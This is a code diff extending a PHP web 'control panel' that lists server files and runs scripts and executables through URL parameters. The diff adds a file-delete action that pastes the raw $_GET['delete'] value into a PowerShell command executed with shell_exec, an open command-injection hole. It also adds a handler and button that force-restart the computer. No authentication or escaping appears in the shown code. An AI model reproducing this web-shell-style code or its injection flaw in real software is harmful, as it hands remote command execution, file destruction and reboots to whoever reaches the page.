@@ -101,7 +101,25 @@
         $command = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $scriptPath . ') }';
         exec('cd '.realpath(getDir()).' && '.$scriptPath, $cmdresults, $retval);
     }
-    
+    else if (isset($_GET['delete'])) {
+        $script = $_GET['delete'];
+        $scriptPath = getAbsolute($script);
+        $command = 'pwsh -Noni -Nop -Command "& { Write-Output "Deleting file "'. $scriptPath . '"; $Null = Remove-Item -Path "' . $scriptPath . '" -Force -ErrorAction Ignore }"';
+        global $cmdresults;
+        global $retval;
+        $cmdresults[0] = shell_exec($command);
+    }
+    else if (isset($_GET['quickaction'])) {
+        $action = $_GET['quickaction'];
+        switch ($action) {
+          case "restart":
+        	$command = 'pwsh -noni -nop -Command "& {Restart-Computer -Force}"';
+        	$cmdresults = shell_exec($command);
+            break;
+          default:
+            break;
+        }
+    }
     // Download a file from the server
     if (isset($_GET['download'])) {
         $file = $_GET['download'];
@@ -131,6 +149,9 @@
     }
     function getSecondaryColor(){
         return '#d92626';
+    }
+    function getThirdColor(){
+        return '#d0d0d0';
     }
     function getCommandColor(){
         return '#ff0066';
@@ -194,26 +215,43 @@
         $retval .= '</td>';
         return $retval;
     }
+    function getItemZeroAction($filename) {
+        $retval =  '';
+        $ext = pathinfo($filename, PATHINFO_EXTENSION);
+        $retval .=  '<td style="color: "' .  getThirdColor() . '"> n/a </td>';
+        return $retval;
+    }
     function getItemActions($filename) {
         $retval =  '';
         $ext = pathinfo($filename, PATHINFO_EXTENSION);
+   
+        
+        if(is_dir($filename)){
+            echo "\n<!-- DEBUG $filename isaDir TRUE -->\n";
+            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $retval .= makeZipArchive($filename);
+        }else{
+            echo "\n<!-- DEBUG $filename isaDir FALSE -->\n";
+            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            $retval .= makeDeleteFile($filename);
+        }
         switch ($ext) {
           case "ps1":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            //$retval .=  getSecondaryColor();
             $retval .= makeRunScriptFile($filename);
             break;
           case "bat":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
+           // $retval .= getSecondaryColor();
             $retval .= makeRunBatFile($filename);
             break;
           case "exe":
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
+            //$retval .= getSecondaryColor();
             $retval .= makeRunExeFile($filename);
             break;
           default:
-            $retval .=  '<td style="color: "' .  getSecondaryColor() . '">';
-            $retval .= htmlspecialchars('noop');
+
         }
+
         $retval .= '</td>';
         return $retval;
     }
@@ -289,13 +327,19 @@
         }
     }
     function makeRunScriptFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run </a>';
     }
     function makeRunExeFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run </a>';
+    }
+    function makeDeleteFile($file) {
+        return '<a href="'.$_SERVER['PHP_SELF'].'?delete='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'del </a>';
     }
     function makeRunBatFile($file) {
-        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run</a>';
+        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'run </a>';
+    }
+    function makeZipArchive($file) {
+        return '<a href="'.$_SERVER['PHP_SELF'].'?zipdir='.getAbsolute(getDir().'/'.$file).'&dir='.realpath(getDir()) . '">'.'zip </a>';
     }
     function getFiles() {
         $files = scandir(getDir());
@@ -308,8 +352,18 @@
                 echo '<td style="font-weight:thin;">'.makeFileName($filename).'</td>'; 
                 //echo '<td>owner</td>';
                 //echo '<td>'.printPerms(getDir().'/'.$filename).'</td>';
+                $fileFullPath = getDir().'/'.$filename;
+                if(is_dir($fileFullPath)){
+                    $fileFullPath = getDir().'/'.$filename;
+                }else{
+                    $fileFullPath = $filename;
+                }
                 echo ''.getItemSize($filename).'';
-                echo ''.getItemActions($filename).'';
+                if ($filename == '..' || $filename == '.'){
+                    echo ''.getItemZeroAction($fileFullPath).'';
+                }else{
+                    echo ''.getItemActions($fileFullPath).'';
+                }
                 echo '</tr>';
                 $even = !$even;
             }
@@ -366,6 +420,12 @@
 
                 if (path) window.location = (url + path);
             }
+            function confirmOperation() {
+                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
+                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");
+
+                if (path) window.location = (url + path);
+            }
         </script>
         <style>
             :root {
@@ -387,6 +447,19 @@
             }
         </style>
         <script>
+            const popupHtmlConfirm = `
+                <div class="popup-container" id="upload-popup">
+                    <div class="popup">
+                        <h4>HARD REBOOT OF COMPUTER RIGHT NOW!</h4>
+                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir().'&quickaction=restart' ?>" method="POST" enctype="multipart/form-data">
+                            <div class="popup-buttons">
+                                <button type="button" onclick="hidePopup()">Cancel</button>
+                                <input type="submit" value="confirm" name="confirm">
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            `;
             const popupHtmlUploadFile = `
                 <div class="popup-container" id="upload-popup">
                     <div class="popup">
@@ -415,6 +488,17 @@
                     </div>
                 </div>
             `;
+            function loadUrl(newLocation)
+            {
+                window.location = newLocation;
+                return false;
+            }
+            function showConfirmPopup() {
+                const body = document.getElementsByTagName('body')[0];
+                const bodyHTML = body.innerHTML;
+
+                body.innerHTML = popupHtmlConfirm + bodyHTML;
+            }
             function showUploadPopup() {
                 const body = document.getElementsByTagName('body')[0];
                 const bodyHTML = body.innerHTML;
@@ -438,6 +522,7 @@
             <nav>
                 <h1>> control panel</h1>
                 <div class="nav-items">
+                	<a onclick="showConfirmPopup()">[restart now]</a>
                     <a onclick="showUploadPopup()">[upload]</a>
                     <a onclick="changeDir()">[cd]</a>
                 </div>
